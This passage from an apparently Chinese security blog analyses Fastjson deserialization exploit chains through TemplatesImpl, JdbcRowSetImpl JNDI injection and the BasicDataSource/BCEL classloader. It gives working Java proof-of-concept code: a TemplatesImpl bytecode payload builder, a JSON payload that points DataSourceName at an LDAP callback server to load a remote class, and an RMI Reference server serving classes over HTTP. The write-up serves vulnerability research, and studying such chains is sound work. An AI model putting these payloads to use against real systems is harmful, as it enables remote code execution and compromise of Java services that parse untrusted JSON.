class="type">ErrorMsg</span> <span class="variable">err</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.TRANSLET_OBJECT_ERR, _name);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            <span class="type">ErrorMsg</span> <span class="variable">err</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.TRANSLET_OBJECT_ERR, _name);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>继续深入的分析，我们已经在CC链专题中讲过了，这里就不再多说</p>
<p>我们要想走到<code>defineTransletClasses</code>方法，并进行实例化类，需要以下几个条件成立 </p>
<ul>
<li>_name 不等于 null</li>
<li>_class 等于 null</li>
<li><font style="color:#080808;background-color:#ffffff;">_tfactory 为 TransformerFactoryImpl</font></li>
</ul>
<p>因此在设想中，我们的poc大概是以下这样的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">String</span> <span class="variable">NASTY_CLASS</span> <span class="operator">=</span> <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> <span class="type">String</span> <span class="variable">evilClassPath</span> <span class="operator">=</span> <span class="string">&quot;E:\\JavaClass\\TemplatesBytes.class&quot;</span>;</span><br><span class="line"><span class="string">&quot;</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string"> \&quot;@type\&quot;:\&quot;&quot;</span> + NASTY_CLASS + <span class="string">&quot;\&quot;,</span></span><br><span class="line"><span class="string"> \&quot;_bytecodes\&quot;:[\&quot;&quot;</span>+evilCode+<span class="string">&quot;\&quot;],</span></span><br><span class="line"><span class="string"> &#x27;_name&#x27;:&#x27;Drunkbaby&#x27;,</span></span><br><span class="line"><span class="string"> &#x27;_tfactory&#x27;:&#123; &#125;,</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>但是实际上，<code>getTransletInstance</code>并不满足我们的getter的条件</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> Translet <span class="title function_">getTransletInstance</span><span class="params">()</span></span><br><span class="line">        <span class="keyword">throws</span> TransformerConfigurationException &#123;</span><br><span class="line">        ......</span><br><span class="line">            <span class="keyword">return</span> translet;</span><br><span class="line">        &#125;</span><br><span class="line">        ......</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>我们应该找哪里调用了该方法，发现只有<code>newTransformer</code>中调用了，但他不是符合setter或getter方法，继续向上找去，找到一个符合条件的setter与getter</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> Transformer <span class="title function_">newTransformer</span><span class="params">()</span></span><br><span class="line">        <span class="keyword">throws</span> TransformerConfigurationException</span><br><span class="line">    &#123;</span><br><span class="line">        TransformerImpl transformer;</span><br><span class="line"></span><br><span class="line">        transformer = <span class="keyword">new</span> <span class="title class_">TransformerImpl</span>(getTransletInstance(), _outputProperties,</span><br><span class="line">            _indentNumber, _tfactory);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (_uriResolver != <span class="literal">null</span>) &#123;</span><br><span class="line">            transformer.setURIResolver(_uriResolver);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) &#123;</span><br><span class="line">            transformer.setSecureProcessing(<span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> transformer;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>最终我们找到了方法<code>getOutputProperties</code>，是可以让我们利用的getter方法，它的返回值<code>Properties</code>正是一个<code>Map</code>类型</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> Properties <span class="title function_">getOutputProperties</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> newTransformer().getOutputProperties();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (TransformerConfigurationException e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>大概链子如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">getOutputProperties()  ---&gt; newTransformer() ---&gt; TransformerImpl(getTransletInstance(), _outputProperties, _indentNumber, _tfactory);</span><br></pre></td></tr></table></figure>

<p>现在我们的大概POC如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">String</span> <span class="variable">NASTY_CLASS</span> <span class="operator">=</span> <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> <span class="type">String</span> <span class="variable">evilClassPath</span> <span class="operator">=</span> <span class="string">&quot;E:\\JavaClass\\TemplatesBytes.class&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string"> \&quot;@type\&quot;:\&quot;&quot;</span> + NASTY_CLASS + <span class="string">&quot;\&quot;,</span></span><br><span class="line"><span class="string"> \&quot;_bytecodes\&quot;:[\&quot;&quot;</span>+evilCode+<span class="string">&quot;\&quot;],</span></span><br><span class="line"><span class="string"> &#x27;_name&#x27;:&#x27;Drunkbaby&#x27;,</span></span><br><span class="line"><span class="string"> &#x27;_tfactory&#x27;:&#123; &#125;,</span></span><br><span class="line"><span class="string"> \&quot;_outputProperties\&quot;:&#123; &#125;,</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;</span>;</span><br></pre></td></tr></table></figure>

<h4 id="JawVE">实现</h4>
自己的poc不知道为什么一直无法弹出计算器，看了别的师傅的payload修改后才成功

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">fastjsonTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">test</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] convert(String path) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(path);</span><br><span class="line">        <span class="keyword">if</span> (!file.exists()) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IOException</span>(<span class="string">&quot;File not found: &quot;</span> + path);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> (<span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file)) &#123;</span><br><span class="line">            <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[(<span class="type">int</span>) file.length()];</span><br><span class="line">            <span class="type">int</span> <span class="variable">readBytes</span> <span class="operator">=</span> fis.read(bytes);</span><br><span class="line">            <span class="keyword">if</span> (readBytes != file.length()) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IOException</span>(<span class="string">&quot;Failed to read the entire file: &quot;</span> + path);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> bytes;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">NASTY_CLASS</span> <span class="operator">=</span> <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">classPath</span> <span class="operator">=</span> <span class="string">&quot;F:\\temporary\\Test.class&quot;</span>;</span><br><span class="line">        <span class="type">byte</span>[] code= convert(classPath);</span><br><span class="line">        <span class="type">String</span> <span class="variable">evilCode_base64</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(code);</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span></span><br><span class="line">                <span class="string">&quot;&#123;\&quot;&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;@type\&quot;:\&quot;&quot;</span> + NASTY_CLASS + <span class="string">&quot;\&quot;,&quot;</span> + <span class="string">&quot;\&quot;&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;_bytecodes\&quot;:[\&quot;&quot;</span> + evilCode_base64 + <span class="string">&quot;\&quot;],&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;&#x27;_name&#x27;:&#x27;asd&#x27;,&#x27;&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;_tfactory&#x27;:&#123; &#125;,\&quot;&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;_outputProperties\&quot;:&#123; &#125;&quot;</span> + <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">        <span class="type">ParserConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ParserConfig</span>();</span><br><span class="line">        System.out.println(payload);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(payload, Object.class, config, Feature.SupportNonPublicField);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741665111732-1dd04f0a-f731-4b88-b195-368974de28ae.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741665111732-1dd04f0a-f731-4b88-b195-368974de28ae.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h3 id="mlKqj">基于JdbcRowSetImpl的利用链</h3>
<h4 id="ZjhDP">分析</h4>

<p>我们找到<code>JdbcRowSetImpl</code>类中的<code>connect</code>方法存在一个<code>lookup</code>方法，可能存在JNDI注入</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> Connection <span class="title function_ invoke__">connect</span>() throws SQLException &#123;</span><br><span class="line">        <span class="keyword">if</span> (this.conn != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> this.conn;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (this.<span class="title function_ invoke__">getDataSourceName</span>() != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                InitialContext var1 = <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">                DataSource var2 = (DataSource)var1.<span class="title function_ invoke__">lookup</span>(this.<span class="title function_ invoke__">getDataSourceName</span>());</span><br><span class="line">                <span class="keyword">return</span> this.<span class="title function_ invoke__">getUsername</span>() != <span class="literal">null</span> &amp;&amp; !this.<span class="title function_ invoke__">getUsername</span>().<span class="title function_ invoke__">equals</span>(<span class="string">&quot;&quot;</span>) ? var2.<span class="title function_ invoke__">getConnection</span>(this.<span class="title function_ invoke__">getUsername</span>(), this.<span class="title function_ invoke__">getPassword</span>()) : var2.<span class="title function_ invoke__">getConnection</span>();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NamingException var3) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SQLException</span>(this.resBundle.<span class="title function_ invoke__">handleGetObject</span>(<span class="string">&quot;jdbcrowsetimpl.connect&quot;</span>).<span class="title function_ invoke__">toString</span>());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> this.<span class="title function_ invoke__">getUrl</span>() != <span class="literal">null</span> ? DriverManager.<span class="title function_ invoke__">getConnection</span>(this.<span class="title function_ invoke__">getUrl</span>(), this.<span class="title function_ invoke__">getUsername</span>(), this.<span class="title function_ invoke__">getPassword</span>()) : <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><code>connect</code>方法对<code>this.getDataSourceName()</code>进行了<code>lookup</code></p>
<p>以下是<code>getDataSourceName</code>的代码，若我们可以控制dataSource，即可实现JNDI注入</p>
<p>虽然dataSource是一个私有属性，但是在本类中具有它public的setter方法，因此它是一个可控变量</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_ invoke__">getDataSourceName</span>() &#123;</span><br><span class="line">        <span class="keyword">return</span> dataSource;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_ invoke__">setDataSourceName</span>(String name) throws SQLException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (name == <span class="literal">null</span>) &#123;</span><br><span class="line">            dataSource = <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (name.<span class="title function_ invoke__">equals</span>(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SQLException</span>(<span class="string">&quot;DataSource name cannot be empty string&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           dataSource = name;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        URL = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>接下来我们找<code>connect</code>方法的调用处，需要是一个getter或者是setter</p>
<p>我们找到了以下两种方法，而只有<code>setAutoCommit</code>方法是可以利用的</p>
<p>而getDatabaseMetaData不可利用的原因是</p>
<ol>
<li>返回值为<code>DatabaseMetaData</code>，不为指定类型</li>
<li>遍历getter方法需要使用<code>parseObject</code>方法，若要调用getter，则在<code>toJSON</code>方法前不能出错</li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1737018884738-9b76e56b-4ec4-4e2f-a931-1cd6da406537.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1737018884738-9b76e56b-4ec4-4e2f-a931-1cd6da406537.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>这里我们使用<code>setAutoCommit</code>方法，只要我们传入var1参数，这里我们可以调用<code>connect</code>方法，实现JNDI注入</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAutoCommit</span><span class="params">(<span class="type">boolean</span> var1)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.conn != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="built_in">this</span>.conn.setAutoCommit(var1);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.conn = <span class="built_in">this</span>.connect();</span><br><span class="line">        <span class="built_in">this</span>.conn.setAutoCommit(var1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="dTrkQ">实现</h4>
我用yakit的反连服务器工具来生成LDAP反连地址

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1737020099338-09dc52aa-5f7b-4ccc-9cb4-fed45383e78a.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1737020099338-09dc52aa-5f7b-4ccc-9cb4-fed45383e78a.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>它的实现十分简单，我们需要设置三个键值对</p>
<ul>
<li>@type : com.sun.rowset.JdbcRowSetImpl</li>
<li>DataSourceName : ldap:&#x2F;&#x2F;127.0.0.1:8085&#x2F;ENbcWWGK</li>
<li>autoCommit : false</li>
</ul>
<p>我们需要设置DataSource，但是它的setter方法为DataSourceName，因此我们需要传入的是DataSourceName</p>
<p>而正如上面所说，我们想要执行connect方法，就要设置传入<code>setAutoCommit</code>的参数为false</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FastJsonJdbcRowSetImpl</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;DataSourceName\&quot;:\&quot;ldap://127.0.0.1:8085/ENbcWWGK\&quot;,\&quot;autoCommit\&quot;:false&#125;&quot;</span>;</span><br><span class="line">        JSON.parseObject(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样即可使远程类加载</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1737020566383-b0cfb972-0932-4411-a35c-f6ae4e255453.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1737020566383-b0cfb972-0932-4411-a35c-f6ae4e255453.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>rmi也是同理，依旧可以造成注入</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="comment">// RMI</span></span><br><span class="line">        <span class="comment">//initialContext.rebind(&quot;rmi://localhost:1099/remoteObj&quot;, new RemoteObjImpl()); // JNDI 注入漏洞</span></span><br><span class="line">        <span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;TestRef&quot;</span>,<span class="string">&quot;TestRef&quot;</span>,<span class="string">&quot;http://localhost:7777/&quot;</span>);</span><br><span class="line">        initialContext.rebind(<span class="string">&quot;rmi://localhost:1099/remoteObj&quot;</span>, reference);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1737028187532-8f35b1ad-15a9-4796-be40-6ea5e1cdb7fb.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1737028187532-8f35b1ad-15a9-4796-be40-6ea5e1cdb7fb.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h2 id="vQ7Z9">不出网</h2>
<h3 id="i5BrD">基于BasicDataSource的不出网利用链</h3>
<h4 id="Axayj">分析</h4>
在出网情况下可以远程加载恶意类，如果在目标不出网的情况下，只能通过本地类加载来利用

<p>我们这里的核心是BCEL中的一个<code>ClassLoader</code>的<code>loadclass</code>，若这个类的开头命名满足<code>$$BCEL$$</code>，就会创建出一个类，并进行类加载</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class <span class="title function_">loadClass</span><span class="params">(String class_name, <span class="type">boolean</span> resolve)</span></span><br><span class="line">    <span class="keyword">throws</span> ClassNotFoundException</span><br><span class="line">  &#123;</span><br><span class="line">    ......</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(cl == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">JavaClass</span> <span class="variable">clazz</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Third try: Special request?</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span>(class_name.indexOf(<span class="string">&quot;$$BCEL$$&quot;</span>) &gt;= <span class="number">0</span>)</span><br><span class="line">          clazz = createClass(class_name);</span><br><span class="line">        <span class="keyword">else</span> &#123; <span class="comment">// Fourth try: Load classes via repository</span></span><br><span class="line">          <span class="keyword">if</span> ((clazz = repository.loadClass(class_name)) != <span class="literal">null</span>) &#123;</span><br><span class="line">            clazz = modifyClass(clazz);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(class_name);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">          <span class="type">byte</span>[] bytes  = clazz.getBytes();</span><br><span class="line">          cl = defineClass(class_name, bytes, <span class="number">0</span>, bytes.length);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="comment">// Fourth try: Use default class loader</span></span><br><span class="line">          cl = Class.forName(class_name);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(resolve)</span><br><span class="line">        resolveClass(cl);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    classes.put(class_name, cl);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> cl;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>现在我们构造一个恶意类，用BCEL的<code>ClassLoader</code>进行类加载，并进行实例化，即可弹出计算器</p>
<p>这里使用<code>encode</code>的原因是在BCEL的<code>ClassLoader</code>的<code>loadclass</code>中，有一个方法<code>createClass</code>，其中对传入的参数进行了一次<code>decode</code>，因此我们需要手动<code>encode</code>一次才不会出错</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> JavaClass <span class="title function_">createClass</span><span class="params">(String class_name)</span> &#123;</span><br><span class="line">    <span class="type">int</span>    <span class="variable">index</span>     <span class="operator">=</span> class_name.indexOf(<span class="string">&quot;$$BCEL$$&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">real_name</span> <span class="operator">=</span> class_name.substring(index + <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">JavaClass</span> <span class="variable">clazz</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="type">byte</span>[]      bytes  = Utility.decode(real_name, <span class="literal">true</span>);</span><br><span class="line">      <span class="type">ClassParser</span> <span class="variable">parser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassParser</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes), <span class="string">&quot;foo&quot;</span>);</span><br><span class="line"></span><br><span class="line">      clazz = parser.parse();</span><br><span class="line">    &#125; </span><br><span class="line">    ......</span><br><span class="line">    <span class="keyword">return</span> clazz;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1737023258681-e5d4eccc-abf0-4d06-a76f-94833c392181.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1737023258681-e5d4eccc-abf0-4d06-a76f-94833c392181.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>接下来就要找到调用该类loadclass的地方，一直向上找最终找到getter或者是setter</p>
<p>我们找到tomcat中的<code>BasicDataSource</code>类中的<code>createConnectionFactory</code></p>
<p>若<code>driverClassLoader</code>不为空，则使用该类加载器对<code>driverClassName</code>进行加载</p>
<p>而正好这两个属性都有对应的setter方法，是可控的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> ConnectionFactory <span class="title function_">createConnectionFactory</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">        <span class="comment">// Load the JDBC driver class</span></span><br><span class="line">        <span class="type">Driver</span> <span class="variable">driverToUse</span> <span class="operator">=</span> <span class="built_in">this</span>.driver;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (driverToUse == <span class="literal">null</span>) &#123;</span><br><span class="line">            Class&lt;?&gt; driverFromCCL = <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">if</span> (driverClassName != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="keyword">if</span> (driverClassLoader == <span class="literal">null</span>) &#123;</span><br><span class="line">                            driverFromCCL = Class.forName(driverClassName);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            driverFromCCL = Class.forName(driverClassName, <span class="literal">true</span>, driverClassLoader);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (<span class="keyword">final</span> ClassNotFoundException cnfe) &#123;</span><br><span class="line">                        driverFromCCL = Thread.currentThread().getContextClassLoader().loadClass(driverClassName);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (<span class="keyword">final</span> Exception t) &#123;</span><br><span class="line">                    <span class="keyword">final</span> <span class="type">String</span> <span class="variable">message</span> <span class="operator">=</span> <span class="string">&quot;Cannot load JDBC driver class &#x27;&quot;</span> + driverClassName + <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">                    logWriter.println(message);</span><br><span class="line">                    t.printStackTrace(logWriter);</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SQLException</span>(message, t);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            ......</span><br><span class="line">        <span class="keyword">return</span> driverConnectionFactory;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>现在我们向上找，知道找到可利用的getter或setter方法</p>
<p><code>createDataSource</code>方法调用了<code>createConnectionFactory</code></p>
<p><code>getconnection</code>调用了<code>createDataSource</code></p>
<p>而<code>getconnection</code>就是一个可用的getter方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> DataSource <span class="title function_">createDataSource</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">        ......</span><br><span class="line">            <span class="keyword">final</span> <span class="type">ConnectionFactory</span> <span class="variable">driverConnectionFactory</span> <span class="operator">=</span> createConnectionFactory();</span><br><span class="line">        ......</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Connection <span class="title function_">getConnection</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">        ......</span><br><span class="line">        <span class="keyword">return</span> createDataSource().getConnection();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>成功加载恶意类</p>
